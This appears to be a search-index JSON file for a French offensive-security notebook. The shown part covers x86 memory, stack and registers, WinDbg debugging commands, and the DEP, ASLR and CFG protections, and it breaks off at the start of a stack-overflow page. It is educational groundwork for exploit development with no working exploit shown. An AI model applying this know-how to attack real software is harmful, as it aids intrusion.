{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Holistic Pwning","text":"<p>Bring your offensive spirit to the next level</p> <ul> <li> <p> Holistique</p> <p>Qui rel\u00e8ve de l\u2019holisme, consid\u00e9rant l\u2019objet comme constituant d'un tout</p> <p> Holistique</p> </li> <li> <p> Pwning</p> <p>Associ\u00e9 \u00e0 perfectly own - gagner avec de la marge</p> <p> Pwning</p> </li> </ul> <p> </p> <p>Bloc-note \u00e0 ciel ouvert r\u00e9dig\u00e9 \u00e0 99.9 % en langue fran\u00e7aise par un franco-qu\u00e9b\u00e9cois d'adoption</p> <ul> <li> No bullshit</li> <li> Only technical shit</li> <li> Few misspellings</li> <li> French only</li> </ul>"},{"location":"binary-exploitation/0-architecture-x86/","title":"Architecture et debugger","text":""},{"location":"binary-exploitation/0-architecture-x86/#architecture-x86","title":"Architecture x86","text":""},{"location":"binary-exploitation/0-architecture-x86/#la-memoire","title":"La m\u00e9moire","text":"<p>Quand un programme est ex\u00e9cut\u00e9, il alloue de la m\u00e9moire en respectant les limites impos\u00e9es par le syst\u00e8me.</p> <p>Allocation de la m\u00e9moire dans Windows entre l'adresse m\u00e9moire la plus basse <code>0x00000000</code> et l'adresse m\u00e9moire la plus haute <code>0x7FFFFFFF</code> :</p> <p> </p>"},{"location":"binary-exploitation/0-architecture-x86/#la-pile","title":"La pile","text":"<p>Quand un thread est en cours d'ex\u00e9cution, il a besoin d'une zone de stockage de donn\u00e9e \u00e0 court terme pour :</p> <ul> <li>les fonctions</li> <li>les variables locales</li> <li>les informations de contr\u00f4le du programme</li> </ul> <p>C'est dans la pile (stack) que ces \u00e9l\u00e9ments sont stock\u00e9s.</p> <p>Pour simplifier l'ex\u00e9cution multi-thread chaque thread dans une m\u00eame application utilise une pile diff\u00e9rente.</p> <p>La pile est vue par le CPU comme une m\u00e9moire de structure <code>Last-In, First-Out (LIFO)</code> :</p> <ul> <li>Les \u00e9l\u00e9ments d\u00e9pos\u00e9s (<code>pushed</code>) en haut de la pile sont supprim\u00e9s (<code>popped</code>) en premier</li> <li>L'architecture x86 impl\u00e9mente deux instructions Assembleur d\u00e9di\u00e9es<ul> <li><code>PUSH</code> : Ajout dans le pile</li> <li><code>POP</code> : Retrait de la pile</li> </ul> </li> </ul>"},{"location":"binary-exploitation/0-architecture-x86/#conventions-dappels","title":"Conventions d'appels","text":"<p>Les conventions d'appels d\u00e9crivent comment les fonctions re\u00e7oivent leurs param\u00e8tres depuis leur appelant et comment elles renvoient leur r\u00e9sultat.</p> <p>L'architecture offre plusieurs conventions d'appels dont les diff\u00e9rences sont li\u00e9es \u00e0 :</p> <ul> <li>Comment les param\u00e8tres et la valeur de retour sont envoy\u00e9s :<ul> <li>Registres CPU</li> <li>D\u00e9pos\u00e9 sur la pile</li> <li>Les deux</li> </ul> </li> <li>Dans quel ordre sont pass\u00e9s les param\u00e8tres</li> <li>Comment la pile est pr\u00e9par\u00e9e et nettoy\u00e9e apr\u00e8s l'appel</li> <li>Quels registres CPU la fonction appel\u00e9e doit conserver pour l'appelant</li> </ul> <p>G\u00e9n\u00e9ralement, le compilateur d\u00e9termine quelle convention d'appel est utilis\u00e9e pour toutes les fonctions d'un programme. <code>cdecl</code> est un exemple de conventions d'appel.</p>"},{"location":"binary-exploitation/0-architecture-x86/#retours-de-fonction","title":"Retours de fonction","text":"<p>Quand du code au sein d'un <code>thread</code> appelle une fonction il doit connaitre son adresse de retour pour revenir au code appelant une fois la fonction compl\u00e9t\u00e9e.</p> <p>L'adresse de retour est stock\u00e9e dans la pile :</p> <ul> <li>Avec les param\u00e8tres de la fonction</li> <li>Ainsi que les variables locales</li> </ul> <p>Ces donn\u00e9es sont associ\u00e9es \u00e0 un appel de fonction et sont stock\u00e9es dans une section de la <code>stack</code> nomm\u00e9e <code>stack frame</code>.</p> <p> </p> <p>Quand une fonction se termine, l'adresse de retour est r\u00e9cup\u00e9r\u00e9e depuis la pile et utilis\u00e9e pour restaurer le flot d'ex\u00e9cution de la fonction appelante.</p>"},{"location":"binary-exploitation/0-architecture-x86/#les-registres-du-cpu","title":"Les registres du CPU","text":"<p>Les registres sont de tout petits et tr\u00e8s rapides espaces m\u00e9moire permettant de lire et manipuler rapidement les donn\u00e9es.</p> <p>Dans une architecture 32 bits, le CPU utilise 9 registres de 32 bits.</p> <p> </p> <p>Les noms ont \u00e9taient d\u00e9finis pour l'architecture 16 bits et ont ensuite \u00e9t\u00e9 \u00e9tendus pour les plates-formes 32 bits avec la lettre <code>E</code>.</p> <p>Chaque registre peut contenir une valeur de 32 bits entre <code>0x00000000</code> et <code>0xFFFFFFFF</code> ou bien 16 bits ou 8 bits dans les sous-registres associ\u00e9s.</p> <p> </p> <ul> <li><code>EAX</code> : Accumulator : Op\u00e9rations logiques et arithm\u00e9tiques</li> <li><code>EBX</code> : Base : Pointeur de base adresse m\u00e9moire</li> <li><code>ECX</code> : Counter : Boucle, d\u00e9placement, rotation</li> <li><code>EDX</code> : Data : Input/Output, multiplication, division</li> <li><code>ESI</code> : Source Index : Pointer addressing of data and source in string copy operations</li> <li><code>EDI</code> : Destination Index : Pointer addressing of data and destination in string copy operations</li> </ul>"},{"location":"binary-exploitation/0-architecture-x86/#esp-pointeur-de-pile","title":"ESP : Pointeur de pile","text":"<p>La pile permet de stocker des donn\u00e9es, des pointeurs et des arguments. La pile \u00e9volue en permanence durant l'ex\u00e9cution du programme.</p> <p>Le pointeur de pile permet de suivre l'\u00e9volution de la localisation la plus r\u00e9cente de la pile. Il pointe sur le haut de la pile.</p> <p>Pointeur</p> <p>Un pointeur est une r\u00e9f\u00e9rence vers une adresse en m\u00e9moire. Quand on dit qu'un registre contient un pointeur ou pointe sur adresse, cela veut dire que le registre contient l'adresse cibl\u00e9e.</p>"},{"location":"binary-exploitation/0-architecture-x86/#ebp-pointeur-de-base","title":"EBP : Pointeur de base","text":"<p>La pile \u00e9volue constamment. Il peut devenir compliqu\u00e9 pour une fonction de suivre sa <code>stack frame</code> qui contient les arguments requis, les variables locales et l'adresse de retour.</p> <p><code>EBP</code> va pointer sur le haut de la pile quand la fonction est appel\u00e9e. La fonction va ensuite pouvoir utiliser <code>EBP</code> pour r\u00e9f\u00e9rencer les informations via offset.</p> <p>Chaque bloc est sur 4 octets :</p> <ul> <li>Si on est a 2 blocs de EBP : <code>[ebp] + 8</code></li> <li>Si on est a 4 blocs de EBP :  <code>[ebp] + 12</code></li> </ul>"},{"location":"binary-exploitation/0-architecture-x86/#eip-pointeur-dinstructions","title":"EIP : Pointeur d'instructions","text":"<p>Un des registres les plus importants. Ce registre pointe toujours vers la prochaine instruction de code \u00e0 ex\u00e9cuter.</p> <p><code>EIP</code> permet de g\u00e9rer le flot du programme, c'est la cible principale pour les d\u00e9passements de tampon.</p>"},{"location":"binary-exploitation/0-architecture-x86/#windows-debugger","title":"Windows Debugger","text":"<p>Il existe plusieurs outils de debug tel que :</p> <ul> <li>OllyDbg</li> <li>Immunity Debugger</li> <li>WinDBG</li> </ul> <p>Un debugger est un programme informatique ins\u00e9r\u00e9 entre une application et le CPU. Un debugger agit comme un proxy. Il permet de voir et d'interagir avec la m\u00e9moire et le flot d'ex\u00e9cution.</p> <p>Le CPU travaille avec du code binaire difficilement lisible par un humain. Le langage <code>Assembleur</code> fournis un mappage d\u2019un pour un entre le binaire et le langage de programmation. Langage lisible par un humain.</p> <p>Opcode</p> <p><code>Opcode</code> : S\u00e9quence binaire interpr\u00e9t\u00e9e par le CPU comme une instruction pr\u00e9cise.Le debugger affichera la valeur en hexad\u00e9cimal et en langage assembleur.</p> <p>Le debugger \u00e9tudi\u00e9 ici est <code>WinDBG</code>.</p>"},{"location":"binary-exploitation/0-architecture-x86/#les-symboles","title":"Les symboles","text":"<p>Les fichiers de symboles permettent \u00e0 WinDBG de r\u00e9f\u00e9rencer les fonctions et structures internes ainsi que les variables globales en utilisant des noms plut\u00f4t que des adresses.</p> <p>On peut utiliser le fichier de symbole de Microsoft pour les ex\u00e9cutables Windows.</p> <p>Les fichiers de symboles (<code>.PDB</code>) sont cr\u00e9\u00e9s \u00e0 la compilation par Microsoft de ses fichiers natifs. Microsoft ne fournit pas les fichiers de symbole pour chaque fichier. Les applications tierces peuvent avoir leur fichier <code>PDB</code>.</p>"},{"location":"binary-exploitation/0-architecture-x86/#acceder-et-manipuler-la-memoire","title":"Acc\u00e9der et manipuler la m\u00e9moire","text":"<p>On peut afficher la traduction en assembleur d'une partie du code du programme avec la commande <code>u</code>. Elle permet de lire le code ASM des API Windows ou de n'importe quelle partie du programme en cours.</p> <p>La commande <code>u</code> accepte :</p> <ul> <li>Une adresse m\u00e9moire</li> <li>Une plage d'adresse (debut - fin)</li> <li>Le nom d'une fonction (e.g. API Windows) via un symbole</li> <li>S'il n'y a pas d'argument, le d\u00e9sassemblage commence dans l'EIP</li> </ul> <pre><code>0:006&gt; u kernel32!GetCurrentThread\nKERNEL32!GetCurrentThread:\n77732620 b8feffffff      mov     eax,0FFFFFFFEh\n77732625 c3              ret\n77732626 cc              int     3\n[...]\n</code></pre>"},{"location":"binary-exploitation/0-architecture-x86/#lire-la-memoire","title":"Lire la m\u00e9moire","text":"<p>On peut utiliser la commande <code>display</code> (<code>d</code>) suivit un indicateur de taille pour afficher le contenu de la m\u00e9moire :</p> <ul> <li><code>b</code> : <code>byte</code> : un byte</li> </ul> <pre><code>0:006&gt; db esp\n07e2fa5c  f9 9b 87 77 bf ba 31 c3-c0 9b 87 77 c0 9b 87 77  ...w..1....w...w\n07e2fa6c  00 00 00 00 60 fa e2 07-00 00 00 00 d4 fa e2 07  ....`...........\n[...]\n</code></pre> <ul> <li><code>w</code> : <code>word</code> : deux bytes</li> </ul> <pre><code>0:006&gt; dw esp\n07e2fa5c  9bf9 7787 babf c331 9bc0 7787 9bc0 7787\n07e2fa6c  0000 0000 fa60 07e2 0000 0000 fad4 07e2\n[...]\n</code></pre> <ul> <li><code>d</code> : <code>dword</code> : quatre bytes</li> </ul> <pre><code>0:006&gt; dd esp\n07e2fa5c  77879bf9 c331babf 77879bc0 77879bc0\n07e2fa6c  00000000 07e2fa60 00000000 07e2fad4\n[...]\n</code></pre> <ul> <li><code>q</code> : <code>qword</code> : huit bytes</li> </ul> <pre><code>0:006&gt; dq 07e2fa5c\n07e2fa5c  c331babf`77879bf9 77879bc0`77879bc0\n07e2fa6c  07e2fa60`00000000 07e2fad4`00000000\n[...]\n</code></pre> <p>On peut choisir d'afficher les caract\u00e8res <code>ASCII</code> :</p> <ul> <li><code>dc</code> : 4 octets et les caract\u00e8res <code>ASCII</code></li> <li><code>dW</code> : 2 octets et les caract\u00e8res <code>ASCII</code></li> </ul> <pre><code>0:006&gt; dW 07e2fa5c\n07e2fa5c  9bf9 7787 babf c331 9bc0 7787 9bc0 7787  ...w..1....w...w\n07e2fa6c  0000 0000 fa60 07e2 0000 0000 fad4 07e2  ....`...........\n[...]\n</code></pre> <pre><code>0:006&gt; dc 07e2fa5c\n07e2fa5c  77879bf9 c331babf 77879bc0 77879bc0  ...w..1....w...w\n07e2fa6c  00000000 07e2fa60 00000000 07e2fad4  ....`...........\n[...]\n</code></pre> <p>La taille par d\u00e9faut peut \u00eatre modifi\u00e9e avec le param\u00e8tre <code>L*</code>. La valeur qui va suivre <code>L</code> va influencer la quantit\u00e9 de donn\u00e9es affich\u00e9es.</p> <pre><code>0:006&gt; dW esp L10\n07e2fa5c  9bf9 7787 babf c331 9bc0 7787 9bc0 7787  ...w..1....w...w\n07e2fa6c  0000 0000 fa60 07e2 0000 0000 fad4 07e2  ....`...........\n#\n0:006&gt; dW esp L2\n07e2fa5c  9bf9 7787                                ...w\n#\n0:006&gt; dW esp L1\n07e2fa5c  9bf9                                     ..\n</code></pre> <p>La commande <code>poi()</code> affiche le contenu de l'adresse contenu dans le registre :</p> <pre><code>0:006&gt; dd esp L1\n07e2fa5c  77879bf9\n#\n0:006&gt; dd 77879bf9\n77879bf9  c03307eb 658bc340 fc45c7e8 fffffffe\n77879c09  e0e8006a ccfff98d cccccccc cccccccc\n</code></pre> <p>Est \u00e9quivalent \u00e0 :</p> <pre><code>0:006&gt; dd poi(esp)\n77879bf9  c03307eb 658bc340 fc45c7e8 fffffffe\n77879c09  e0e8006a ccfff98d cccccccc cccccccc\n</code></pre>"},{"location":"binary-exploitation/0-architecture-x86/#afficher-les-structures-en-memoire","title":"Afficher les structures en m\u00e9moire","text":"<p>Les structures sont un concept de programmation qui combine diff\u00e9rents types de donn\u00e9es. Elles sont faciles \u00e0 lire avant la compilation, apr\u00e8s la compilation le code est traduit en valeur binaire et devient compliqu\u00e9 \u00e0 lire.</p> <ul> <li>La commande <code>display</code> peut permettre d'afficher des structures</li> <li>La commande <code>Display Table</code> (<code>dt</code>) prends le nom de la structure \u00e0 afficher</li> </ul> <p>Affichage de la structure <code>Thread Environment Block</code> (<code>TEB</code>) :</p> <pre><code>0:006&gt; dt ntdll!_TEB\n   +0x000 NtTib            : _NT_TIB\n   +0x01c EnvironmentPointer : Ptr32 Void\n   +0x020 ClientId         : _CLIENT_ID\n   +0x028 ActiveRpcHandle  : Ptr32 Void\n   +0x02c ThreadLocalStoragePointer : Ptr32 Void\n   +0x030 ProcessEnvironmentBlock : Ptr32 _PEB\n   +0x034 LastErrorValue   : Uint4B\n[...]\n</code></pre> <p>La commande affiche les champs, leur type et leur offset. Il est possible qu'un champ de la structure pointe sur une deuxi\u00e8me structure, exemple <code>NtTib : _NT_TIB</code>. On peut utiliser <code>-r</code> pour afficher les structures de mani\u00e8res r\u00e9cursives.</p> <pre><code>0:006&gt; dt -r ntdll!_TEB\n   +0x000 NtTib            : _NT_TIB\n      +0x000 ExceptionList    : Ptr32 _EXCEPTION_REGISTRATION_RECORD\n         +0x000 Next             : Ptr32 _EXCEPTION_REGISTRATION_RECORD\n         +0x004 Handler          : Ptr32           _EXCEPTION_DISPOSITION \n      +0x004 StackBase        : Ptr32 Void\n[...]\n      +0x010 Version          : Uint4B\n      +0x014 ArbitraryUserPointer : Ptr32 Void\n      +0x018 Self             : Ptr32 _NT_TIB\n         +0x000 ExceptionList    : Ptr32 _EXCEPTION_REGISTRATION_RECORD\n         +0x004 StackBase        : Ptr32 Void\n[...]\n   +0x01c EnvironmentPointer : Ptr32 Void\n</code></pre>"},{"location":"binary-exploitation/0-architecture-x86/#les-pseudo-registres","title":"Les pseudo-registres","text":"<p>Les pseudo-registres sont des variables sp\u00e9cifiques au sein de WinDbg qui peuvent \u00eatre utilis\u00e9es notamment durant les op\u00e9rations de calculs.</p> <ul> <li><code>$teb</code> est un pseudo-registre qui contient l'adresse du <code>TEB</code> du thread courant, on peut l'utiliser de cette mani\u00e8re :</li> </ul> <pre><code>0:006&gt; dt -r ntdll!_TEB @$teb\n   +0x000 NtTib            : _NT_TIB\n      +0x000 ExceptionList    : 0x0720fa50 _EXCEPTION_REGISTRATION_RECORD\n         +0x000 Next             : 0x0720faac _EXCEPTION_REGISTRATION_RECORD\n         +0x004 Handler          : 0x77847390           _EXCEPTION_DISPOSITION  ntdll!_except_handler4+0\n      +0x004 StackBase        : 0x07210000 Void\n[...]\n      +0x014 ArbitraryUserPointer : (null) \n      +0x018 Self             : 0x00ead000 _NT_TIB\n         +0x000 ExceptionList    : 0x0720fa50 _EXCEPTION_REGISTRATION_RECORD\n[...]\n         +0x014 ArbitraryUserPointer : (null) \n         +0x018 Self             : 0x00ead000 _NT_TIB\n   +0x01c EnvironmentPointer : (null) \n   +0x020 ClientId         : _CLIENT_ID\n[...]\n</code></pre> <p>Il existe 20 pseudo-registres d\u00e9finis par d\u00e9faut nomme de <code>$t0</code> \u00e0 <code>$t19</code> qui peuvent \u00eatre utilis\u00e9 comme variable durant les op\u00e9rations math\u00e9matiques.</p> <pre><code># Stockage de l'addition dans $t0\n0:000&gt; r @$t0 = (41414141 + 41414141)\n# Affichage de $t0\n0:000&gt; r @$t0\n$t0=82828282\n# Stockage de la soustraction dans $t1\n0:000&gt; r @$t1 = @$t0 / 5\n# Affichage de $t1\n0:000&gt; r @$t1\n$t1=1a1a1a1a\n</code></pre>"},{"location":"binary-exploitation/0-architecture-x86/#ecrire-en-memoire","title":"\u00c9crire en m\u00e9moire","text":"<p>Il est aussi possible d'\u00e9crire en m\u00e9moire. La commande pour ce faire est <code>e*</code> avec <code>*</code> la taille \u00e0 \u00e9crire :</p> <ul> <li><code>d</code> : Dword</li> </ul> <pre><code># Lecture du registre ESP\n0:006&gt; dd esp L1\n0720fa34  77879bf9\n# Ecriture du DWORD 41414141 dans le registre ESP\n0:006&gt; ed esp 41414141\n0:006&gt; dd esp L1\n0720fa34  41414141\n</code></pre> <ul> <li><code>w</code> : Word</li> <li><code>a</code> : ASCII string</li> </ul> <pre><code>0:006&gt; da esp L5\n0720fa34  \"AAAA\"\n0:006&gt; ea esp \"Hello\"\n0:006&gt; da esp L5\n0720fa34  \"Hello\"\n</code></pre>"},{"location":"binary-exploitation/0-architecture-x86/#chercher-en-memoire","title":"Chercher en m\u00e9moire","text":"<p>Le d\u00e9veloppement d'exploit peut n\u00e9cessiter la recherche dans l'espace m\u00e9moire pour un motif sp\u00e9cifique. WinDbg permet de chercher avec la commande <code>s</code>.</p> <p>La commande prend 4 param\u00e8tres :</p> <ul> <li>Le type de m\u00e9moire dans lequel chercher</li> <li>Le point de d\u00e9part</li> <li>La longueur sur laquelle chercher</li> <li>Le motif \u00e0 chercher</li> </ul> <pre><code># \u00c9criture\n0:000&gt; ed esp 41414141\n# Lecture\n0:000&gt; da esp\n0096f69c  \"AAAA.6|w\"\n# Recherche\n## On identifie bien `0096f69c` (adresse de ESP) dans la recherche - parmi d'autres\n0:000&gt; s -d 0 L?80000000 41414141\n0096f69c  41414141 777c36cc 00bca000 00000000  AAAA.6|w........\n67d23820  41414141 db5e5e5e b6b7b7db b4b6b6b6  AAAA^^^.........\n6e804600  41414141 00d5b7af 00000000 00000000  AAAA............\n</code></pre>"},{"location":"binary-exploitation/0-architecture-x86/#inspecter-et-editer-les-registres","title":"Inspecter et \u00e9diter les registres","text":"<p>On peut acc\u00e9der aux registres CPU via la commande <code>r</code>. Permets d'afficher et modifier les valeurs des registres.</p> <pre><code># Tout afficher\n0:000&gt; r\neax=00000000 ebx=00000000 ecx=0096f680 edx=77841670 esi=00bca000 edi=777c36cc\neip=7787bb62 esp=0096f69c ebp=0096f6c8 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\nntdll!LdrpDoDebuggerBreak+0x2b:\n7787bb62 cc              int     3\n# Afficher un seul registre\n0:000&gt; r ecx\necx=0096f680\n# Modifier un seul registre\n0:000&gt; r edx\nedx=77841670\n0:000&gt; r edx=42424242\n0:000&gt; r edx\nedx=42424242\n</code></pre>"},{"location":"binary-exploitation/0-architecture-x86/#les-points-darret","title":"Les points d'arr\u00eat","text":"<p>WinDBG permet de d\u00e9finir des <code>breakpoints</code> pour stopper l'ex\u00e9cution aux endroits voulus dans le code.</p> <p>Il existe 2 types de points d'arr\u00eats :</p> <ul> <li>Logiciel</li> <li>Mat\u00e9riel</li> </ul>"},{"location":"binary-exploitation/0-architecture-x86/#points-darrets-logiciels","title":"Points d'arr\u00eats logiciels","text":"<p>Quand on positionne un point d'arr\u00eat logiciel avec WinDBG il remplace temporairement le 1er opcode de l'instruction ou l'on veut s'arr\u00eater avec une instruction assembleur <code>INT 3</code>. On peut en d\u00e9finir autant qu'on veut.</p> <p>D\u00e9finir un point d'arr\u00eat sur l'API Win32 <code>WriteFile</code> :</p> <pre><code>bp kernel32!WriteFile\n</code></pre> <p>Puis on peut lister les BP avec <code>bl</code> :</p> <pre><code>0:006&gt; bl\n     0 e Disable Clear  7773c6d0     0001 (0001)  0:**** KERNEL32!WriteFile\n</code></pre> <ul> <li>On peut d\u00e9sactiver un point d'arr\u00eat avec <code>bd</code></li> <li>On utilise <code>bc</code> pour supprimer un point d'arr\u00eat</li> </ul>"},{"location":"binary-exploitation/0-architecture-x86/#fonctions-non-resolues","title":"Fonctions non r\u00e9solues","text":"<p>On utilise la commande <code>bu</code> pour d\u00e9finir des points d'arr\u00eats sur des fonctions unresolved. Fonction pr\u00e9sente au sein d'un module qui n'est pas encore charg\u00e9 dans l'espace m\u00e9moire d'un processus. Le point d'arr\u00eat va \u00eatre activ\u00e9 quand le module sera charg\u00e9 et que la fonction cible sera r\u00e9solue.</p> <pre><code># Chercher le module OLE32.dll\n0:000&gt; lm m ole32\nBrowse full module list\nstart    end        module name\n# Cr\u00e9er un point d'arr\u00eat unresolved sur la fonction `WriteStringStream` du module `OLE32`\n0:000&gt; bu ole32!WriteStringStream\n0:000&gt; bl\n     0 e Disable Clear u             0001 (0001) (ole32!WriteStringStream)\n# On relance l'ex\u00e9cution - On voit que le module `ole32` est charg\u00e9\n0:000&gt; g\nModLoad: 776e0000 77706000   C:\\Windows\\System32\\IMM32.DLL\n[...]\nModLoad: 75fc0000 760b7000   C:\\Windows\\System32\\ole32.dll\n# Notre point d'arr\u00eat est r\u00e9solu\n0:008&gt; bl\n     0 e Disable Clear  75fe1cd0     0001 (0001)  0:**** ole32!WriteStringStream\n</code></pre>"},{"location":"binary-exploitation/0-architecture-x86/#points-darrets-automatiques","title":"Points d'arr\u00eats automatiques","text":"<p>Il est possible d'automatiser l'ex\u00e9cution de commande avec le debugger quand un point d'arr\u00eat est d\u00e9clench\u00e9.</p> <p>Exemple, afficher le nombre de octets \u00e9crit dans un fichier \u00e0 chaque fois qu'un point d'arr\u00eat sur <code>kernel32!WriteFile</code> est d\u00e9clench\u00e9 :</p> <ul> <li>Utiliser la commande <code>.printf</code> avec le format <code>%p</code> pour afficher un pointeur</li> <li>La commande <code>.echo</code> affiche l'output de <code>.printf</code> dans une fen\u00eatre de WinDbg</li> <li>On utilise <code>;</code> pour s\u00e9parer les commandes</li> <li>On affiche le contenu de <code>esp + 0x0C</code></li> </ul> <p>Prototype de <code>WriteFile</code> :</p> <pre><code>BOOL WriteFile(\n  HANDLE       hFile,\n  LPCVOID      lpBuffer,\n  DWORD        nNumberOfBytesToWrite,\n  LPDWORD      lpNumberOfBytesWritten,\n  LPOVERLAPPED lpOverlapped\n);\n</code></pre> <ul> <li>Chaque param\u00e8tre occupe 4 octets en m\u00e9moire dans la pile. <code>0x0C</code> correspond donc a 12 octets. Ce qui correspond au 3em argument de <code>WriteFile</code> qui est <code>nNumberOfBytesToWrite</code>, a savoir le nombre d'octets \u00e9crit</li> <li>Windows x86 API utilise la convention d'appel <code>__stdcall</code> qui positionne les arguments dans la pile de droite \u00e0 gauche</li> </ul> <pre><code>bp kernel32!WriteFile \".printf \\\"The number of bytes written is: %p\\\", poi(esp + 0x0C);.echo;g\"\n</code></pre> <p>Il est aussi possible de d\u00e9finir des points d'arr\u00eat conditionnels. C'est-\u00e0-dire que l'ex\u00e9cution s'arr\u00eate uniquement si la condition est respect\u00e9e.</p> <p>Exemple, un point d'arr\u00eat conditionnel sur <code>kernel32!WriteFile</code>. Le point d'arr\u00eat sera d\u00e9clench\u00e9 et l'ex\u00e9cution stopp\u00e9e seulement si l'on \u00e9crit exactement 4 octets :</p> <pre><code>bp kernel32!WriteFile \".if (poi(esp + 0x0C) != 4) {gc} .else {.printf \\\"The number of bytes written is 4\\\";.echo;}\"\n</code></pre> <ul> <li><code>gc</code> : Go from Conditional Breakpoint</li> </ul>"},{"location":"binary-exploitation/0-architecture-x86/#points-darrets-materiels","title":"Points d'arr\u00eats mat\u00e9riels","text":"<p>Les points d'arr\u00eats processeur ou mat\u00e9riel sont g\u00e9r\u00e9s par le CPU et stock\u00e9s dans les registres de debug du CPU.</p> <p>Il existe 6 registres de debug dans l'architecture <code>x86</code>, le nombre est donc limit\u00e9 par rapport aux points d'arr\u00eats logiciels :</p> <ul> <li><code>DR0</code> \u00e0 <code>DR03</code></li> <li><code>DR06</code></li> <li><code>DR07</code></li> </ul> <p>Les points d'arr\u00eats mat\u00e9riels peuvent \u00eatre d\u00e9finis avec la commande <code>ba</code> qui prend 3 arguments :</p> <ul> <li>1er : Type d'acc\u00e8s</li> <li><code>e</code> : <code>execute</code></li> <li><code>r</code> : <code>read</code></li> <li><code>w</code> : <code>write</code></li> <li>2em : Taille en octets pour l'acc\u00e8s m\u00e9moire indiqu\u00e9</li> <li>3em : Adresse m\u00e9moire o\u00f9 on veut mettre le point d'arr\u00eat</li> </ul> <p>Point d'arr\u00eat mat\u00e9riel sur l'ex\u00e9cution de l'API <code>WriteFile</code></p> <pre><code>0:006&gt; ba e 1 kernel32!WriteFile\n0:006&gt; g\n</code></pre> <p>La finalit\u00e9 est la m\u00eame qu'un point d'arr\u00eat logiciel. Mais la on utilise les registres de debug du CPU plut\u00f4t que d'alt\u00e9rer le code avec des instructions <code>INT 3</code>.</p> <p>On d\u00e9finit un point d'arr\u00eat mat\u00e9riel en <code>write</code> sur les <code>2</code> premier octet du string <code>Unicode</code> (<code>0x00</code> et <code>0x77</code>) sur l'adresse m\u00e9moire <code>00a99b68</code> :</p> <pre><code>0:006&gt; ba w 2 00a99b68\n0:006&gt; bl\n     0 e Disable Clear  00a99b68 w 2 0001 (0001)  0:**** \n</code></pre> <p>Les points d'arr\u00eat mat\u00e9riel sont utiles pour trouver ou les donn\u00e9es sont prises en charge durant l'ex\u00e9cution.</p> <p>Savoir les diff\u00e9rencier et les utiliser :</p> <ul> <li>Avec un point d'arr\u00eat logiciel, il aurait fallu trouver l'endroit ou il allait y avoir la modification</li> <li>Avec un point d'arr\u00eat mat\u00e9riel, on a pas besoin de connaitre l'endroit ou la modification se fait. On peut juste d\u00e9clencher quand elle arrive et donc trouver l'endroit ou la modification est faite.</li> </ul>"},{"location":"binary-exploitation/0-architecture-x86/#lister-les-modules","title":"Lister les modules","text":"<p>On peut afficher les modules charg\u00e9s dans l'espace m\u00e9moire du processus avec la commande <code>lm</code> :</p> <pre><code>0:000&gt; lm\nstart    end        module name\n010a0000 010df000   NOTEPAD    (deferred)             \n584f0000 5856a000   DUser      (deferred)             \n58570000 586df000   DUI70      (deferred)             \n[...]\n</code></pre> <p>On peut lister les modules en filtrant avec <code>*</code>.  On affiche ici les modules qui commencent par <code>kernel</code> :</p> <pre><code>0:000&gt; lm m kernel*\nBrowse full module list\nstart    end        module name\n74220000 7422e000   kernel_appcore\n74540000 74718000   KERNELBASE\n77710000 777a5000   KERNEL32\n</code></pre>"},{"location":"binary-exploitation/0-architecture-x86/#operations-mathematiques","title":"Op\u00e9rations math\u00e9matiques","text":"<p>On utilise l'op\u00e9rateur <code>?</code> pour g\u00e9rer les expressions math\u00e9matiques :</p> <pre><code>0:000&gt; ? 74663bcf - 746bd888\nEvaluate expression: -367801 = fffa6347\n</code></pre>"},{"location":"binary-exploitation/0-architecture-x86/#formats-de-donnees","title":"Formats de donn\u00e9es","text":"<p>L'affichage par d\u00e9faut est hexad\u00e9cimal. Mais il est possible de demander un autre format :</p> <pre><code># Hexa\n## h`41414141` = d`1094795585`\n0:000&gt; ? 41414141\nEvaluate expression: 1094795585 = 41414141\n# Hexa -&gt; Decimal\n# d`41414141` = h`0277edfd`\n0:000&gt; ? 0n41414141\nEvaluate expression: 41414141 = 0277edfd\n# Binary to Decimal to Hexa\n## b`1110100110111` = d`7479` = h`00001d37`\n0:000&gt; ? 0y1110100110111\nEvaluate expression: 7479 = 00001d37\n</code></pre> <p>On peut utiliser <code>.formats</code> pour convertir en plusieurs types</p> <pre><code>0:000&gt; .formats 41414141\nEvaluate expression:\n  Hex:     41414141\n  Decimal: 1094795585\n  Octal:   10120240501\n  Binary:  01000001 01000001 01000001 01000001\n  Chars:   AAAA\n  Time:    Thu Sep  9 22:53:05 2004\n  Float:   low 12.0784 high 0\n  Double:  5.40901e-315\n</code></pre>"},{"location":"binary-exploitation/0-architecture-x86/#les-protections-memoire","title":"Les protections m\u00e9moire","text":"<p>Plusieurs m\u00e9canismes mis en oeuvre dans les syst\u00e8mes Windows peuvent rendre la prise de contr\u00f4le de <code>EIP</code> plus complexe.</p> <p>Ces contr\u00f4les doivent \u00eatre actifs \u00e0 la compilation pour \u00eatre pris en compte durant l'exploitation</p>"},{"location":"binary-exploitation/0-architecture-x86/#data-execution-prevention","title":"Data Execution Prevention","text":"<p><code>Data Execution Prevention</code> (<code>DEP</code>) : Pr\u00e9viens l'ex\u00e9cution de code depuis les page <code>data</code> en levant une exception quand une tentative est faite</p>"},{"location":"binary-exploitation/0-architecture-x86/#aslr","title":"ASLR","text":"<p><code>Address Space Layout Randomization</code> (<code>ASLR</code>) : Randomise les adresses de base des applications charg\u00e9es et des DLL a chaque red\u00e9marrage de l'OS.</p> <p>Dans les OS comme XP sans ASLR toutes les DLL sont charg\u00e9es syst\u00e9matiquement \u00e0 la m\u00eame adresse m\u00e9moire ce qui facilite l'exploitation.</p>"},{"location":"binary-exploitation/0-architecture-x86/#cfg","title":"CFG","text":"<p><code>Control Flow Guard</code> (<code>CFG</code>) : Impl\u00e9mentation de Microsoft du Control Flow Integrity. Ce m\u00e9canisme contr\u00f4le les indirect code branching. Utilisation de <code>call &lt;instruction&gt;</code> utilisant un registre tel que <code>call EAX</code> comme op\u00e9rande plut\u00f4t qu'une adresse m\u00e9moire.</p> <p>Pr\u00e9viens la r\u00e9\u00e9criture de pointeur de fonction dans des exploits.</p>"},{"location":"binary-exploitation/1-stack-overflow/","title":"Stack Overflow","text":"<p>Les d\u00e9passements de tampon bas\u00e9s sur la pile (stack) sont caus\u00e9s par un trop-plein d'\u00e9criture au sein d'une variable stock\u00e9e dans la 